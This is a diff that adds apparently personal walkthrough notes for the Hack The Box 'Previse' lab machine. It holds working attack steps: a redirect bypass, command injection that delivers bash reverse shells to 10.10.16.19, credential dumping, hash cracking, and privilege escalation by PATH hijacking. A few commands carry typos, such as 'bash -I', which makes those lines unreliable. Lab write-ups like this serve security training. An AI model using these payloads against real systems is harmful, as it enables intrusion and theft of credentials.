@@ -1,0 +1,181 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.11.104
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.11.104
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53ed4440116e8bda698579c081f23a12 (RSA)
+|   256 bc5420ac1723bb5020f4e16e620f01b5 (ECDSA)
+|_  256 33c189ea5973b1788438a421100c91d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.11.104/login.php
+please intercept response:
+result:
+HTTP/1.1 200 OK
+Date: Thu, 29 Jun 2023 10:33:48 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 2287
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+        <meta charset="utf-8" />
+
+please read this: https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)
+some vulnerability:
+<?php if (!$loggedin) {
+     print "<script>window.location = '/login';</script>\n\n"; 
+} ?>
+
+access: http://10.10.11.104/ and intercept response.
+result:
+HTTP/1.1 302 Found
+Date: Thu, 29 Jun 2023 10:34:59 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: login.php
+Content-Length: 2801
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+change 302 Found to 200 OK
+please setting proxy change response header every 302 Found to 200 OK
+
+access: http://10.10.11.104/accounts.php
+please register whit 0xdf password 0xdf0xdf
+
+access: http://10.10.11.104/files.php
+access: http://10.10.11.104/status.php
+access: http://10.10.11.104/file_logs.php
+some rce on file_logs please submit and intercept it.
+
+please login using username 0xdf and password 0xdf0xdf
+then intercet logs.php
+
+change to this:
+delim=comma%3b%20ping%20-c%201%2010.10.16.19
+url decode: delim=comma; ping -c 1 10.10.16.19
+
+command: sudo tcpdump -i tun0 icmp
+result:
+17:43:03.496028 IP 10.10.11.104 > 10.10.16.19: ICMP echo request, id 21627, seq 1, length 64
+17:43:03.496055 IP 10.10.16.19 > 10.10.11.104: ICMP echo reply, id 21627, seq 1, length 64
+
+command: nc -lvnp 7979
+
+let's change payload to this:
+comma; bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'
+comma%3b%20bash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.16.19%2f7979%200%3e%261'
+
+please upgrade the shell
+command: cd /var/www/html
+command: cat config.php
+<?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+?>
+
+command: mysql -h localhsot -u root -p'mySQL_p@ssw0rd!:)'
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| previse            |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+command: use previse;
+mysql> show tables;
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+
+mysql> select * from accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | 0xdf0xdf | $1$🧂llol$ptDNU8fUK.DTMxwymaOkJ1 | 2023-06-28 19:26:06 |
++----+----------+------------------------------------+---------------------+
+
+put $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. to m4lwhere
+command: hashcat -m 500 m4lwhere /home/donika-pentest/Documents/hackthebox/linux/26_postman_easy/rockyou.txt --show
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+
+command: sudo -l
+[sudo] password for m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+
+command: cat /opt/scripts/access_backup.sh
+result:
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
+
+command: cd ~/
+please create script name gzip with this bash script code:
+#!/bin/bash
+bash -I >& /dev/tcp/10.10.16.19/4444 0>&1
+
+command: chmod +x gzip
+command: export PATH=/home/m4lwhere:$PATH
+host> nc -lvnp 4444
+
+comamnd: sudo /opt/scripts/access_backup.sh
+command: cat /root/root.txt
+result:
+603dc052d9f02ef25b3f6b2c52c751d0
+
+resource:
+https://0xdf.gitlab.io/2022/01/08/htb-previse.html#box-info
+https://www.hackingarticles.in/previse-hackthebox-walkthrough/
